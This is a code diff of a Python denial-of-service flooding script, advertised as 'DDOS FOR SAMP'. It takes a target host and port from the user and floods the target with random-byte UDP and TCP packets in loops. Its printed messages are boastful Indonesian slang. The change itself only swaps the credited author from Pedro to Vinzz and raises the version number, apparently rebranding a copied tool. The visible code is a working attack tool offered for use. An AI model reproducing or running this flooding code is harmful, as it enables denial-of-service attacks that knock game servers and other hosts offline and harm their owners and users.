@@ -2,12 +2,12 @@ import random
 import socket
 import threading
 
-print("--- AUTHOR BY : Pedro ---")
-print("--- TOOLS BY : TEAM Excrusher ---")
+print("--- AUTHOR BY : Vinzz ---")
+print("--- TOOLS BY : SAYA SENDIRI ---")
 print("--- JANGAN ABUSE YA ---")
 print("===================================")
 print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
-print("========== VERSION 1.0 ============")
+print("========== VERSION 2.0 ============")
 ip = str(input(" Host Or IP:"))
 port = int(input(" Port:"))
 choice = str(input(" GASS UDP dek?(y/n):"))
@@ -24,7 +24,7 @@ def run():
         s.sendto(data,addr)
       print(i +" OWNERNYA PANAS DINGIN")
     except:
-      print("Pedro ni Banhh!!")
+      print("Vinzz ni Banhh!!")
 
 def run2():
   data = random._urandom(16)
@@ -36,7 +36,7 @@ def run2():
       s.send(data)
       for x in range(times):
         s.send(data)
-      print(i +" Packet from pedro dek!")
+      print(i +" Packet from vinzz dek!")
     except:
       s.close()
       print("[*] Mampus")
